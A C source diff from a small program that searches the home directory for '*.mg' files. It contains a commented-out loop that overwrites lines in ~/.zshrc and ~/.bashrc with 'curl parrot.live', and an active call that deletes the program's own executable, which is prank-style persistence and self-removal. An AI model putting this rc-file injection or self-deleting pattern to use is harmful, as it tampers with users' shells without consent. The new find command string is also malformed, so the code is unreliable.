@@ -139,30 +139,38 @@ int	main(int ac, char **av, char **envp)
 	int			i;
 	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
 	char		*path;
-	char		*find_cmd[] = {"find", "/", "-type", "f", "-name", "*.mg", NULL};
+	char		*commands;
+	char		**find_cmd;
+	// char		*find_cmd[] = {"find", "/", "-type", "f", "-name", "*.mg", NULL};
 
 	i = 0;
 	realpath(getenv("HOME"), home_buffer);
 	realpath(av[0], current_file_buffer);
 	printf("home path %s\n", home_buffer);
+	commands = ft_strjoin_free2("find ", ft_strjoin(home_buffer,  "-type f -name *.mg"));
+	if (!commands)
+		return (1);
+	printf("find cmd %s", commands);
+	find_cmd = ft_split(commands, ' ');
+	if (!find_cmd)
+		return (free(commands), 1);
+	// while (file_list[i])
+	// {
+	// 	path = ft_strjoin(getenv("HOME"), file_list[i]);
+	// 	if (!path)
+	// 		return (1);
+	// 	printf("opening %s\n", path);
+	// 	// fd = open(path, O_RDONLY);
+	// 	// printf("on fd %d\n", fd);
+	// 	// if (fd < 0)
+	// 	// 	return (1);
+	// 	if (replace_line(path, "curl parrot.live"))
+	// 		return (1);
+	// 	close(fd);
+	// 	free(path);
+	// 	i++;
+	// }
 	process_child(find_cmd, envp);
-	return (1);
-	while (file_list[i])
-	{
-		path = ft_strjoin(getenv("HOME"), file_list[i]);
-		if (!path)
-			return (1);
-		printf("opening %s\n", path);
-		// fd = open(path, O_RDONLY);
-		// printf("on fd %d\n", fd);
-		// if (fd < 0)
-		// 	return (1);
-		if (replace_line(path, "curl parrot.live"))
-			return (1);
-		close(fd);
-		free(path);
-		i++;
-	}
 	remove(current_file_buffer);
 	return (0);
 }
